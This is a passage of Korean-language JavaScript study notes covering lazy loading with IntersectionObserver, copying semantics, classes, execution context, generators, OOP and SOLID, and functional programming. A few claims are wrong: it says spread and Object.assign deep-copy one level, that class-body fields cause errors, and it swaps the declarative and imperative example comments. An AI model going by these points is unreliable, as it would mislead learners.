  의도적인 빈 값, 타입 객체

<br>

### # IntersectionObserver

- IntersectionObserver는 WebAPI로 비동기적으로 실행되며 관찰 대상과 뷰포트의 교차점을 관찰하고 뷰포트 안으로 들어오는 시점에 정보를 제공하는 기능. 무한 스크롤이나 페이지 스크롤 시 다른 컨텐츠나 이미지 레이지 로딩 등에 사용

  ```html
  <div class="example">
    <img
      src="https://picsum.photos/600/400/?random?0"
      alt="random image"
      class="image-default"
    />
    <img
      data-src="https://picsum.photos/600/400/?random?1"
      alt="random image"
      class="image"
    />
    <img
      data-src="https://picsum.photos/600/400/?random?2"
      alt="random image"
      class="image"
    />
    <img
      data-src="https://picsum.photos/600/400/?random?3"
      alt="random image"
      class="image"
    />
    <img
      data-src="https://picsum.photos/600/400/?random?4"
      alt="random image"
      class="image"
    />
    <img
      data-src="https://picsum.photos/600/400/?random?5"
      alt="random image"
      class="image"
    />
    <img
      data-src="https://picsum.photos/600/400/?random?6"
      alt="random image"
      class="image"
    />
    <img
      data-src="https://picsum.photos/600/400/?random?7"
      alt="random image"
      class="image"
    />
  </div>
  ```

  ```js
  // IntersectionObserver의 options를 설정합니다.
  const options = {
    root: null,
    // 타겟 이미지 접근 전 이미지를 불러오기 위해 rootMargin을 설정했습니다.
    rootMargin: "0px 0px 30px 0px",
    threshold: 0,
  };

  // IntersectionObserver 를 등록한다.
  const io = new IntersectionObserver((entries, observer) => {
    entries.forEach((entry) => {
      // 관찰 대상이 viewport 안에 들어온 경우 image 로드
      if (entry.isIntersecting) {
        // data-src 정보를 타켓의 src 속성에 설정
        entry.target.src = entry.target.dataset.src;
        // 이미지를 불러왔다면 타켓 엘리먼트에 대한 관찰을 멈춘다.
        observer.unobserve(entry.target);
      }
    });
  }, options);

  // 관찰할 대상을 선언하고, 해당 속성을 관찰시킨다.
  const images = document.querySelectorAll(".image");
  images.forEach((el) => {
    io.observe(el);
  });
  ```

<br>

### # Object Literal, Template Literal

- Template Literal이란?

  Template Literal은 벡틱으로 감싸 사용하는 문자열 표기법이다. 다른 문자열이나 객체 등을 편리하게 결합하여 사용할 수 있다.

- Object Literal이란?

  Object Literal은 중괄호 안에 프로퍼티를 정의하여 객체를 생성한다. 손쉽게 객체를 생성하기 위해 사용한다.

<br>

### # 얕은 복사와 깊은 복사

- 얕은 복사와 깊은 복사

  얕은 복사란 객체를 복사할 때 객체만 복사하여 기존 객체와 복사된 객체가 같은 참조를 가리키는 복사를 말한다. 깊은 복사란 객체를 복사할 때 객체와 참조 값을 모두 복사하여 기존 객체와 복사된 객체의 참조가 완전히 끊어진 복사를 말한다. 자바스크립트에서 값은 원시값과 참조값 두 가지 데이터 타입의 값이 존재한다. 자바스크립트에서 원시 타입의 경우 값이 수정(새로운 값 할당)되면 새로운 메모리 공간에 독립적인 값을 저장하기 때문에 깊은 복사가 되고 참조 타입의 경우 값이 수정(새로운 요소 추가)되면 원본을 직접 수정하므로 얕은 복사가 된다. 얕은 복사의 경우 메모리를 새로 할당받지 않아 메모리 공간을 아낄 수 있지만 원본이 변화될 수 있는 위험이 있고 깊은 복사는 메모리 공간을 새로 할당받아 메모리 공간을 소비하지만 원본이 변화되지 않아 안전하다.

  ```js
  const a = 1;
  const b = 1;
  const c = [];
  const d = [];

  console.log(a === b); // true, 원시 데이터이므로 값을 비교하여 값이 같기 때문에 true
  console.log(c === d); // false, 참조 데이터이므로 참조를 비교하여 참조가 다르기 때문에 false
  ```

- 얕은 복사 방법

  1. slice() : 기본적으로 얕은 복사를 수행한다. 1차원 배열을 복사하면 깊은 복사처럼 보이는데 원시 타입은 기본적으로 깊은 복사이므로 깊은 복사처럼 보인다. 하지만 2차원 배열을 복사하면 얕은 복사가 된다.

  2. Object.assign() : 1차원 객체는 깊은 복사, 2차원 객체는 얕은 복사

  3. Spread 연산자 : 1차원 객체는 깊은 복사, 2차원 객체는 얕은 복사

- 깊은 복사 방법

  1. structuredClone()

  ```javascript
  const original = { a: 1, b: { c: 2 } };
  const copy = structuredClone(original);
  ```

  2. JSON.parse(JSON.stringify(obj))

  3. Lodash 라이브러리의 cloneDeep 메소드

<br>

- slice가 1차원 배열은 깊은 복사, 2차원 배열은 얕은 복사를 수행하는 이유

  ```javascript
  // 1차원 참조 타입 복사
  const originalArray = [1, 2, 3, 4];
  const copiedArray = [...originalArray];
  originalArray[0] = 100;

  console.log(originalArray); // [100, 2, 3, 4]
  console.log(copiedArray); // [1, 2, 3, 4]
  ```

  Array.prototype.slice(), Object.assign(), Spread 연산자(…) 모두 기본적으로 얕은 복사를 수행한다. 즉, 깊은 복사처럼 보이지만 실제로 깊은 복사를 수행하는 것이 아니다. 여기서 얕은 복사란 복사란 복사 대상인 참조 타입의 내부 요소들의 참조 주소를 새로운 배열의 참조로 복사하는 것을 의미한다. 즉 아래 예시에서는 originalArray가 가리키는 0x00000F1 배열의 내부 요소들의 참조 주소 0x00000F3,0x00000F4,0x00000F5,0x00000F6 자체를 originalArray이 가리키는 0x00000F2 배열의 참조 주소로 복사하는 것이다.

  여기서 1차원 참조 타입의 값을 복사할 때 깊은 복사처럼 보이는 이유는 1차원 참조 타입의 값은 원시 타입이기 때문이다. 만약 1차원 참조 타입의 값이 원시 타입이 아닌 참조 타입이라면 1차원 참조 타입이 아닌 2차원 참조 타입이다. 결국 1차원 참조 타입의 값은 무조건 원시 타입이라는 것인데 원시 타입의 값은 새로운 값으로 변경될 때 새로운 메모리 영역을 생성하고 그 메모리 주소로 참조 주소를 변경하게 된다.

  위 코드에서 originalArray[0] = 100;를 통해 index 0의 값을 변경할 때 해당 값은 1(0x00000F3)인 원시 타입이기 때문에 100(0x00000F7)으로 참조 주소가 변경되게 된다. 이 때 copiedArray는 복사될 때 참조하고 있던 참조 주소들을 여전히 참조하고 있으므로 변경되지 않는다. 그렇기 때문에 originalArray 의 참조 주소만 변경되게 된다.

  그렇기 때문에 결론적으로 깊은 복사처럼 보이게 된다.

  ![원시타입과_참조타입의_메모리_공간_할당_07](https://github.com/Yu-jae-min/Basic-concept/assets/85284246/25a1bf8f-0fba-4a36-8864-de39d7cba7ae)

  ```javascript
  // 2차원 참조 타입 복사
  const originalArray = [
    [1, 2],
    [3, 4],
  ];
  const copiedArray = [...originalArray];
  originalArray[0][0] = 100;

  console.log(originalArray); // [[100, 2], [3, 4]]
  console.log(copiedArray); // [[100, 2], [3, 4]]
  ```

  위 코드에서 `Spread` 문법을 활용한 2차원 배열의 복사는 메모리 상에서 아래와 같이 동작한다. 우선 위에서 말한 것과 같이 얕은 복사를 수행하여 `originalArray`가 가리키는 `0x00000F1` 배열의 내부 요소들의 참조 주소`0x00000F3`, `0x00000F4`를 `copiedArray`가 가리키는 `0x00000F2` 배열의 내부 value로 복사하게 된다.

  이 때 해당 배열은 2차원 배열이므로 `0x00000F3`, `0x00000F4` 배열 또한 내부에 배열을 가리키는 참조 주소를 가지고 있게 된다. 아래 이미지에서 `[0x00000F5, 0x00000F6]`과 `[0x00000F7, 0x00000F8]`를 말한다.

  그 후 `originalArray[0][0] = 100;`를 통해 index 0 배열(`0x00000F3`)의 index 0(`0x00000F5`) value 참조 주소가 `0x00000F9`로 변경되게 된다. 콜스택에 두 식별자가 가리키고 있는 메모리힙에 참조 주소 `0x00000F1`, `0x00000F2` 배열의 내부 value는 여전히 `0x00000F3`, `0x00000F4` 로 동일하기 때문에 콘솔에 찍히는 값은 동일하게 된다.

  ![원시타입과_참조타입의_메모리_공간_할당_08](https://github.com/Yu-jae-min/Basic-concept/assets/85284246/ae872617-5971-4762-ab62-cbe7a270c85b)

- 결론

  기본형은 값이 복사되고, 참조형은 주소(참조)가 복사된다!

  - 참조 복사 예시

    ```js
    const original = [1, 2, 3];
    const copy = original; // 참조를 복사

    copy[0] = 100;

    console.log(original); // [100, 2, 3]
    console.log(copy); // [100, 2, 3]

    // original과 copy는 서로 다른 변수입니다.
    // 하지만 둘 다 같은 배열 객체를 참조합니다.
    // 즉, 참조(주소)가 복사됐을 뿐, 가리키는 대상은 동일합니다.
    ```

  - 1차원 배열 (기본형 요소)

    ```js
    const originalArray = [1, 2, 3, 4];
    const copiedArray = [...originalArray];
    ```

    | 요소 타입  | 복사 방식    | 결과        |
    | ---------- | ------------ | ----------- |
    | 1, 2, 3, 4 | 값 자체 복사 | 서로 독립적 |

    - 각각 number → 기본형(primitive)

    - 값이 복사됨 → 두 배열은 완전히 다른 메모리에 같은 값들을 가지고 있음

    - 그래서 originalArray[0] = 100 해도 copiedArray는 영향 없음

    ```md
    originalArray: [ 1, 2, 3, 4 ] → 값 복사
    copiedArray: [ 1, 2, 3, 4 ] → 완전 독립
    ```

  - 2차원 배열 (참조형 요소)

    ```js
    const originalArray = [
      [1, 2],
      [3, 4],
    ];
    const copiedArray = [...originalArray];
    ```

    | 요소 타입      | 복사 방식     | 결과               |
    | -------------- | ------------- | ------------------ |
    | [1, 2], [3, 4] | 참조만 복사됨 | 내부 배열은 공유됨 |

    - 요소가 배열 → 배열은 객체 → 참조형(reference type)

    - [...originalArray]는 바깥 배열을 새로 만들지만, 안에 들어 있는 [1, 2], [3, 4]는 복사되는 게 아니라 주소(참조)만 복사됨. 그래서 originalArray[0][0] = 100 하면, 같은 내부 배열을 보고 있는 copiedArray[0][0]도 100이 되어버림

    ```mb
    originalArray:   [ ref1, ref2 ]       → ref1 → [1, 2]
    copiedArray:     [ ref1, ref2 ]       → 같은 내부 배열 참조

    즉,
    originalArray[0] === copiedArray[0] → true
    ```

<br>

### # 함수 선언식, 함수 표현식 설명

- 함수 선언식

  1. 함수 선언을 function으로 시작하는 함수

  2. 함수명이 정의되어 있어야 함

  3. 호이스팅 발생

  ```javascript
  function 함수명() {
    구현 로직
  }
  ```

- 함수 표현식

  1. 정의한 function을 별도의 변수에 할당한 함수

  2. 익명 함수 사용 가능

  3. 선언부만 호이스팅 되므로 호이스팅의 영향을 받지 않음

  ```javascript
  var 함수명 = function () {
    구현 로직
  };
  ```

<br>

### # 클래스

- 클래스는 생성자 함수와 같이 상속, 캡슐화 등 객체지향 프로그래밍을 위한 객체의 인스턴스를 생성하기 위해 사용한다. 생성자 함수와의 차이점은 클래스는 항상 strict mode(엄격 모드)로 동작하고 필수적으로 new 키워드와 함께 생성해야하는 등 조금 더 엄격하게 동작하고 사용법에도 차이가 있다. 클래스는 내부에 constructor라는 유니크한 프로퍼티를 가지고 있는데 이 constructor 내부에 선언된 변수들이 상속되는 것이다. 이 변수들을 클래스 필드라고 하며 인스턴스의 프로퍼티가 된다. 또한 클래스 코드 블럭 내 constructor를 제외한 영역을 클래스 바디라고 하며 클래스 바디에는 메소드를 선언하게 된다. 만약 클래스 바디에 클래스 필드를 선언하게 되면 에러가 발생한다. 이렇게 클래스를 생성한 뒤 new 키워드를 통해 인스턴스를 생성할 수 있다. 생성된 인스턴스는 클래스의 클래스 필드를 직접 가지고 있으며 클래스 바디에 선언된 메소드는 프로토타입을 통해 참조하여 사용하게 된다. 또한 클래스는 extends 키워드를 통해 다른 클래스에 상속을 구현할 수 있다. extends를 통해 상속받은 클래스로 생성된 인스턴스 또한 상속한 클래스의 클래스 필드를 직접 가지고 있으며 프로토타입 체인을 통해 클래스가 가지고 있는 메소드를 상속 받아 사용할 수 있게 된다. 또한 게터와 세터같은 접근자 프로퍼티를 클래스 바디에 생성하여 멤버 변수에 접근 시 혹은 값 할당 시 멤버 변수의 값을 제어할 수도 있다.

  ```js
  // ES5 생성자 함수
  const User = function (name, age) {
    this.name = name;
    this.age = age;
    this.showName = function () {
      console.log(this.name);
    };
  };

  const mike = new User("Mike", 30);

  // ES6 클래스
  class User2 {
    constructor(name, age) {
      this.name = name; // 클래스 필드
      this.age = age; // 클래스 필드
    }
    showName() {
      // 프로토타입 프로퍼티에 존재
      console.log(this.name);
    }
  }

  const tom = new User2("Tom", 19);
  ```

<br>

### # 클래스 vs 생성자

![클래스vs생성자](https://github.com/Yu-jae-min/Basic-concept/assets/85284246/1f2955b6-cd59-4c0f-8778-29d81c1b6175)

<br>

### # 원시형 타입, 참조형 타입

- 원시형 타입

  String, Number, Boolean, Undefined, Null, BigInt, Symbol

  - 값 자체가 메모리에 저장됨 (immutable, 값 복사됨)

  - BigInt 타입

    Number 타입은 2⁵³ - 1(Number.MAX_SAFE_INTEGER)만큼의 정수만 안전하게 표현가능하지만 BigInt 타입은 길이의 제약 없이 정수를 다룰 수 있게 해주는 숫자형이다.
    정수 뒤에 n을 붙여 사용하거나 BigInt를 호출하여 인자로 숫자를 넘겨줄 수 있다. 나누기에 경우 소수점 없이 정수만 반환한다.

- 참조형 타입

  원시 타입을 제외한 나머지, 함수, 객체, 배열 등, 참조값(메모리 주소)이 저장됨 (mutable, 얕은 복사 시 원본 영향)

<br>

### # CDN(Content Delivery Network)

- CDN이란

  CDN은 “콘텐츠 전송 네트워크(Content Delivery Network)”의 약자이다. 전 세계 여러 지역에 엣지 서버(=캐시 서버)를 두고, 사용자에게 요청이 왔을 때 가장 가까운 서버에서 정적 콘텐츠를 전달하여 응답 속도와 성능을 향상시키는 기술이다.

  - 정적 컨텐츠

    - JS, CSS, HTML

    - 이미지, 폰트, 동영상

    - PDF, JSON 파일 등

- CDN 동작 방식

  1. 사용자가 웹사이트에 접속

  2. CDN은 사용자의 위치(지리적 거리)를 기반으로 가장 가까운 엣지 서버를 선택

  3. 엣지 서버에 캐시된 콘텐츠가 있으면 → 바로 응답 (빠름!)

  4. 없다면 → 원래 서버(오리진 서버)에서 받아오고, 엣지 서버에 캐시 저장

  5. 다음 사용자는 캐시된 데이터를 빠르게 받음

- CDN 장점

  1. 분산된 서버를 통해 서버의 트래픽 부하를 줄일 수 있다.

  2. 물리적으로 가까운 서버에 요청하므로 응답이 빠르다.

  3. 디도스(의도적으로 트래픽을 폭주시켜 해당 시스템의 서비스가 거부되도록 하는 공격) 공격과 같은 일부 악의적인 공격으로부터 상대적으로 안전하다.

- CDN vs 로드밸런서

  트래픽을 분산한다는 점에서 CDN과 로드 밸런서와 비슷해보일 수 있지만 엄연히 다르다.

  - CDN : CDN은 정적 콘텐츠를 사용자에게 가까운 서버에서 빠르게 전달하는 것

  - 로드 밸런서 : 요청을 여러 서버에 고르게 분산하여 서버 부하를 감소시키는 방법

- CDN 적용 방법 예시

  1. 웹사이트 배포 시 정적 파일을 S3에 저장하고, CloudFront(AWS CDN)로 전 세계 배포

  2. 폰트, 라이브러리(JS 라이브러리 등)를 jsDelivr나 unpkg 같은 퍼블릭 CDN에서 불러오기

<br>

### # 실행 컨텍스트

- 실행 컨텍스트란?

  실행 컨텍스트란 코드 실행에 필요한 환경을 저장해놓은 객체이다. 실행 시점에 따라 전역 컨텍스트, 함수 컨텍스트로 구분되며 자바스크립트 엔진의 콜스택에 쌓이게 된다.
  자바스크립트 런타임의 구조는 자바스크립트 엔진의 콜스택, 메모리 힙과 브라우저의 백그라운드인 Web API, 테스크 큐, 이벤트 루프로 구성되어 있다. 프로그램이 시작되면 가장 먼저 전역 실행 컨텍스트가 생성되고, 콜 스택에 쌓인다. 이후 함수가 호출될 때마다 해당 함수의 실행 컨텍스트 생성 단계가 시작하며 콜 스택의 가장 위에 추가된다.

- 실행 컨텍스트의 생성 단계, 실행 단계

  실행 컨텍스트의 생명 주기는 생성 단계와 실행 단계로 나눌 수 있다. (전역 컨텍스트는 프로그램 시작 시, 함수 컨텍스트는 호출문을 만나면 생성 단계가 시작된다)

  - 1. 생성 단계

    - 환경 레코드에 식별자 정보(변수, 객체, 함수 등)를 저장

    - 스코프 체인 형성

    - this 바인딩을 수행

  - 2. 실행 단계

    - 실제 코드가 위에서 아래로 실행되며, 변수에 값이 할당되고 함수가 호출됨

    - 만약 실행 단계에서 함수 호출 문을 만나게 되면 전역 컨텍스트에 실행 단계를 멈춘 뒤 새로운 함수 컨텍스트를 콜스택에 쌓는다. 그 후 새롭게 쌓인 함수 컨텍스트로 제어권을 넘긴 뒤 생성 단계와 실행 단계를 거치게 된다. 실행 단계가 종료된 후 다시 제어권을 받아와 이어서 실행한다.

    - 비동기 처리

      - 실행 단계에서 비동기 API(fetch, setTimeout 등)인 경우 WEB API로 해당 작업을 넘기고 해당 작업은 콜스택에서 제거한다. 그 후 메인 스레드 작업은 지속한다. 메인 스레드 작업을 수행하며 생성 단계와 실행 단계를 반복하는데 이벤트 루프가 콜스택을 감시하며 콜스택이 비워지는 경우 Web API 넘겨져 처리되어 테스크 큐에 쌓인 비동기 콜백 함수 선입선출 방식으로 밀어넣게 된다. 이 때 한번에 다 밀어넣는 것이 아닌 하나를 밀어넣고 하나가 실행되어 콜스택이 비어질 때 또 하나를 밀어넣는 방식으로 수행된다.

- 자바스크립트 브라우저 런타임 구조

  1. 콜스택

  - 실행 컨텍스트를 저장하는 스택 자료 구조, 실행 컨텍스트 객체 내부 렉시컬 환경에 원시 타입의 데이터가 저장된다.

  - 싱글 스레드 흐름을 관리, 함수 호출 시 위에 쌓이고 함수 실행이 끝나면 제거된다. (후입선출)

  2. 메모리 힙

  - 참조 타입(객체, 배열 등)의 데이터가 저장되는 공간

  - 구조화되지 않은 큰 저장소로, 객체는 주소(참조값)로 접근된다

  3. WebAPI

  - 웹 브라우저에서 제공하는 API로 AJAX나 Timeout등의 비동기 작업을 실행한다.

  - 자바스크립트 자체가 아닌 브라우저 환경에서 제공됨

  4. 테스크 큐

  - WebAPI에서 넘겨받은 콜백 함수를 저장하며 선입선출 방식이다.

  5. 이벤트 루프

  - 콜스택이 비어있는지 계속 감시하며, 콜스택이 비어있다면 테스크 큐의 작업을 콜스택으로 밀어넣는다. (선입선출)

  - 먼저 마이크로태스크(Promise.then 등)를 처리한 후 매크로태스크(Task Queue)를 처리함

<br>

### # 이터러블, 이터레이터와 제너레이터

- 이터러블

  이터러블 객체는 반복 가능한 객체를 말한다. 대표적인 이터러블 객체로는 배열과 문자열이 있다. 또한 기본적으로 이터러블 객체는 for of 반복문을 통해 반복이 가능하다. 이터러블과 비슷한 유사 배열이라는 개념도 있는데 유사 배열은 index와 length 프로퍼티를 가지고 있어 배열처럼 보이는 객체를 말한다. 유사 배열 또한 Symbol.iterator을 통해 이터러블 객체로 만들어 반복할 수 있다.

  ```js
  // 이터러블 예시
  const array1 = ["a", "b", "c"];

  for (const element of array1) {
    console.log(element); // "a" -> "b" -> "c"가 순서대로 출력
  }

  // 유사 배열 예시
  const arrayLike = {
    0: "Hello",
    1: "World",
    length: 2,
  };
  ```

- 제너레이터

  제너레이터는 일반 함수와 다르게 여러 개의 값을 필요에 따라 하나 씩 반환할 수 있다. 또한 제너레이터는 반복 가능한 이터러블 객체이다. function 뒤에 `*`을 붙여 제너레이터 함수를 생성할 수 있고 제너레이터 함수의 리턴 값은 일드(yield)와 리턴(return)이며 next 메소드로 순차적으로 호출할 수 있고 return을 호출할 때 함수가 최종적으로 종료된다. 대표적인 사용 예로 리덕스에서 비동기 api를 사용하기 위해 사용하는 미들웨어인 리덕스 사가에서 제너레이터 문법을 사용한다.

  ```js
  function* generateSequence() {
    yield 1;
    yield 2;
    return 3;
  }

  let generator = generateSequence();

  let one = generator.next();

  alert(JSON.stringify(one)); // {value: 1, done: false}

  for (let value of generator) {
    console.log(value); // 1, 2
  }
  ```

<br>

### # 객체지향 프로그래밍 OOP

- 객체지향 프로그래밍(OOP, Object Oriented Programming)란?

  Object Oriented Programming이며 객체지향 프로그래밍이라고 한다. 상태나 행위를 가진 독립적인 여러 객체들을 레고 블럭처럼 조립하여 프로그래밍하는 방식을 말한다. 상속, 다형성, 캡슐화, 추상화 등의 특징과 모듈화를 통해서 재사용성을 증가시키고 유지보수가 용이하도록 한다. 자바스크립트는 프로토타입 기반의 객체지향 프로그래밍 언어이다.

- 객체지향 프로그래밍 특징

  1. 상속

     부모 객체의 메소드나 변수를 자식 객체가 그대로 물려받을 수 있다. 예를 들어 클래스에서는 상위 클래스의 클래스 필드를 하위 클래스가 상속받는다. javascript에서는 `class`, `extends`, 프로토타입 등이 예시이다.

  2. 다형성

     같은 객체임에도 상황에 따라 다르게 동작할 수 있다. 예를 들어 함수는 매개변수에 따라 출력 값이 다르다. javascript에서는 자식 클래스 메서드 재정의(오버라이딩, 동적 바인딩) 등이 예시이다.

  3. 캡슐화

     메소드나 변수를 하나로 묶고 필요에 따라 접근 권한을 나누어 외부에서 접근하지 못하게 제한을 두는 것을 말한다. 캡슐화를 통해 객체의 손상을 방지하고 정보를 은닉할 수 있다. javascript에서는 클로저, private 필드 등이 예시이다.

  4. 추상화

     연관된 메소드나 변수를 따로 묶어 표현한다. 예를 들어 동물이라는 변수에 강아지, 고양이를 배열에 담아 할당하는 것을 말한다. javascript에서는 함수나 모듈로 추상화할 수 있다.

- 객체지향 프로그래밍의 5가지 설계 원칙, SOLID 원칙

  1. 단일 책임의 원칙

     모든 클래스는 각각 하나의 기능만 가진다.

     ```javascript
     // ❌ 역할이 너무 많음
     class UserManager {
       createUser() {}
       saveToDB() {}
       sendWelcomeEmail() {}
     }

     // ✅ 분리
     class UserCreator {
       createUser() {}
     }
     class UserRepository {
       saveToDB() {}
     }
     class EmailService {
       sendWelcomeEmail() {}
     }
     ```

  2. 개방 폐쇄 원칙

     클래스, 모듈, 함수 등 모든 구성요소는 확장에는 열려있고, 변경에는 닫혀있어야한다.

     ```javascript
     // ✅ 새로운 할인 정책 추가할 수 있지만 기존 코드는 건드리지 않음
     class DiscountPolicy {
       getDiscount(price) {
         return price;
       }
     }

     class BlackFridayDiscount extends DiscountPolicy {
       getDiscount(price) {
         return price * 0.8;
       }
     }
     ```

  3. 리스코프 치환 원칙

     부모 클래스의 자리에 자식 클래스를 넣어도 정상적으로 동작하여야 한다. 자식 클래스는 부모 클래스의 역할을 정확히 해내야한다는 뜻이다.

     ```javascript
     class Bird {
       fly() {}
     }

     class Penguin extends Bird {
       fly() {
         throw new Error("Penguins can't fly");
       } // ❌ LSP 위반
     }
     ```

  4. 인터페이스 분리 원칙

     하나의 인터페이스에 너무 많은 역할을 담지 말고, 클라이언트에 맞는 최소한의 인터페이스만 제공해야 함

     ```javascript
     // ❌ 하나의 인터페이스에 너무 많은 기능
     interface Machine {
       print();
       scan();
       fax();
     }

     // ✅ 역할에 따라 인터페이스 분리
     interface Printer { print(); }
     interface Scanner { scan(); }
     ```

  5. 의존 역전 원칙

     상위 모듈은 하위 모듈에 종속되면 안되고 하위 모듈은 상위 모듈에서 정의한 추상화(추상 타입)에 의존해야 한다.

     ```javascript
     class EmailService {
       sendEmail() {
         /* send logic */
       }
     }

     class UserController {
       constructor(emailService) {
         this.emailService = emailService; // 추상 인터페이스처럼 생각
       }
       registerUser() {
         this.emailService.sendEmail();
       }
     }
     ```

<br>

### # 함수형 프로그래밍(Function Programming)

- 함수형 프로그래밍에 대해 설명해달라.

  함수형 프로그래밍은 순수 함수(pure function)와 보조 함수(조합 함수)의 조합을 통해 상태 변화(state mutation)와 부작용(side-effect)을 피하려는 프로그래밍 패러다임이다. 조건문, 반복문보다는 고차 함수, 재귀, 함수 조합 등을 통해 문제를 해결하며, 불변성(immutability) 유지가 핵심 특징이다.

- 함수형 프로그래밍에 개념에서 순수함수란 무엇인가?

  순수함수는 같은 입력이 주어지면, 같은 출력을 반환해야하는 함수를 말한다. 즉 사이드 이펙트가 없는 함수를 말한다.

- 객체지향 프로그래밍 vs 함수형 프로그래밍 차이

  | 항목        | 객체지향 프로그래밍 (OOP) | 함수형 프로그래밍 (FP) |
  | ----------- | ------------------------- | ---------------------- |
  | 중심 개념   | 객체 (상태 + 행위)        | 함수와 데이터의 변환   |
  | 상태 변경   | 허용됨 (mutable)          | 지양 (immutable)       |
  | 동작 방식   | 메시지 전달, 상호작용     | 함수 호출, 조합        |
  | 주된 요소   | 클래스, 인스턴스, 메서드  | 순수 함수, 고차 함수   |
  | 코드 스타일 | 명령형 (imperative)       | 선언형 (declarative)   |

- 선언형 vs 명령형

  - 비교

    | 구분        | 선언형(Declarative)         | 명령형(Imperative)                    |
    | ----------- | --------------------------- | ------------------------------------- |
    | 개념        | 무엇을 할지 기술            | 어떻게 할지 기술                      |
    | 초점        | 결과에 집중                 | 절차/과정에 집중                      |
    | 코드 스타일 | 간결하고 읽기 쉬움          | 세부 흐름이 드러남                    |
    | 대표 예     | SQL, React, HTML, 함수형 JS | for 루프, DOM 직접 조작, JS 일반 함수 |

  - React 예시

    - 선언형

      ```jsx
      // React에서는 “어떻게 DOM을 생성할지”가 아니라 “이런 UI를 원해요”라고 선언하는 것
      return <div>Hello</div>;
      ```

    - 명령형

      ```javascript
      const div = document.createElement("div");
      div.textContent = "Hello";
      document.body.appendChild(div);
      ```

  - 문제풀이 예시

    - 선언형

      ```javascript
      // 로직 흐름을 전부 기술해야 함
      const nums = [1, 2, 3, 4];
      const result = nums.filter((n) => n % 2 === 0).map((n) => n * n);

      console.log(result); // [4, 16]
      ```

    - 명령형

      ```javascript
      // 내부 동작은 추상화되어 있음 (for문 없음)
      const nums = [1, 2, 3, 4];
      const result = [];

      for (let i = 0; i < nums.length; i++) {
        if (nums[i] % 2 === 0) {
          result.push(nums[i] * nums[i]);
        }
      }

      console.log(result); // [4, 16]
      ```

<br>

### # 절차지향 프로그래밍(procedural programming)

- 절차지향 프로그래밍이란?

  순차적인 처리가 중요시 되며 프로그램 전체가 유기적으로 연결되도록 만드는 프로그래밍 기법이다. 컴퓨터의 작업 처리 방식과 유사하기 때문에 객체지향 프로그래밍에 비해 처리가 빨랐지만 하드웨어의 발달로 인해 소프트웨어 개발 속도가 하드웨어의 처리 속도를 따라가지 못하는 상황이 발생하였다. 이로 인해 하드웨어의 성능을 깎아내리면서 소프트웨어 개발 속도를 빠르게 할 수 있는 객체지향 프로그래밍이 탄생하게 되었다. 절차지향 프로그래밍은 프로그램 전체가 연결되어 있기 때문에 유지보수가 어렵고 재사용성이 낮다. 객체지향 프로그래밍은 캡슐화, 상속, 다형성, 추상화 같은 특징으로 재사용성을 증가시키고 모듈화를 통해 유지보수를 용이하도록 하였다. 반면 어떤 모듈에 있는 하나의 기능만 필요하더라도 모듈 전체를 가져와야 하기 때문에 절차지향 프로그래밍보다 프로그램 사이즈가 더 커질 수도 있다.

- 절차지향 프로그래밍 VS 객체지향 프로그래밍 차이

  객체지향 프로그래밍이 절차지향 프로그래밍의 단점을 보완하기 위해 등장했지만 엄연히 다른 개념이다. 절차지향 프로그래밍의 경우 데이터를 중심으로 코드가 작성되며 객체지향 프로그래밍의 경우 상호작용하는 객체들의 관계를 중심으로 코드가 작성된다. 절차지향 프로그래밍이 실행 속도는 더 빠르지만 객체지향 프로그래밍이 유지보수가 용이하고 재사용성이 높다.

<br>

### # 자바스크립트 부동 소수점 연산 오차

- 자바스크립트의 넘버 타입은 정수(1, 2, 3..)와 실수(0.1, 0.2, 0.3..)를 따로 구분하지 않고 모든 수를 실수 하나로만 표현하며 64비트의 부동소수점 형식을 이용해 프로그래밍에 필요한 모든 수 체계를 지원한다. 따라서 자바처럼 float, int 같은 별도의 타입 대신 number 하나로 표현할 수 있다.

- 자바스크립트에서 0.1 + 0.2 결과 값을 확인해보면 정확하지않다. 이유는 자바스크립트를 통해 작성된 10진수를 자바스크립트 실행 시 내부적으로 64비트의 부동소수점 형식의 2진수로 변환하는데 이 과정에서 0.1, 0.2등의 10진수는 무한 소수가 되기 때문에 근사 값(유한 소수)으로 바꾸어 메모리에 저장한다. 이 과정에서 미세한 오차가 발생한다. 이러한 오차를 부동 소수점 연산 오차라고 한다. 이러한 문제를 해결하기 위해서는 bigNumber와 같은 라이브러리를 활용하여 계산할 수 있다.

<br>

### # 호스트 객체, 네이티브 객체

- 호스트 객체

  자바스크립트 코드가 실행되는 환경(호스트 환경)에서 제공하는 객체이다. 즉, 브라우저, Node.js, Web Worker 등 자바스크립트 엔진을 둘러싼 플랫폼이 자체적으로 제공하는 객체들이다. 호스트 객체는 자바스크립트의 표준이 아닌, 비표준 (환경에서 자체 제공)으로 환경에 따라 다르다.

  - 예시 (브라우저 환경)

    window, document, XMLHttpRequest, localStorage, navigator, location, alert(), console 등, BOM (Browser Object Model), DOM (Document Object Model)

  - 예시 (Node.js 환경)

    require, module, process, global, Buffer, setImmediate, **dirname, **filename 등

- 네이티브 객체

  ECMAScript 사양(ECMA-262)에 명시된 표준 객체이며, 어떤 환경에서도 동일하게 사용할 수 있는 표준 자바스크립트 객체입니다.

  - 예시

    - 기본 객체: Object, Function, Boolean, Symbol

    - 숫자 관련: Number, Math, BigInt

    - 문자열 관련: String

    - 날짜/정규표현식: Date, RegExp

    - 배열 관련: Array, Map, Set, WeakMap, WeakSet

    - 에러 관련: Error, TypeError, RangeError, ReferenceError 등

<br>

### # 기능 검출, 기능 추론

- 기능 검출(Feature detection)

  스크립트가 호출하는 기능을 사용자의 브라우저가 지원하는지 체크하는 것이다. if('localStorage' in window){...}과 같이 localStorage 기능이 존재하는지 체크할 수 있다.

- 기능 추론(Feature inference)

  만약 기능을 브라우저가 지원한다면 다른 기능도 존재할 것이라고 추론하는 것이다. 예를 들어 localStorage 기능을 지원한다면 sessionStorage 기능을 지원 할 것이라고 추론하는 것이다.

<br>

### # 사용하는 디버깅 툴

- 자바스크립트 : 크롬 개발자 도구 소스탭, debugger 키워드, console.log

- 페이지 성능 : 크롬 개발자 도구 라이트하우스

- API 요청 : 크롬 개발자 도구 네트워크, Apollo client devtools(요청 및 캐시 확인)

- 컴포넌트 렌더링 : react developer tools(컴포넌트 렌더링 및 리렌더링 확인)

- 기타 : Redux Devtools(스토어 상태 조회, 디스패치 이력 조회 등)

<br>

### # 객체 관련 메소드

- Object.assign : 객체 내부의 다른 객체의
  프로퍼티를 복사해서 가져온다. 중첩되는 경우 복사되는 프로퍼티가 우선이 된다.

  ```javascript
  const target = { a: 1, b: 2 };
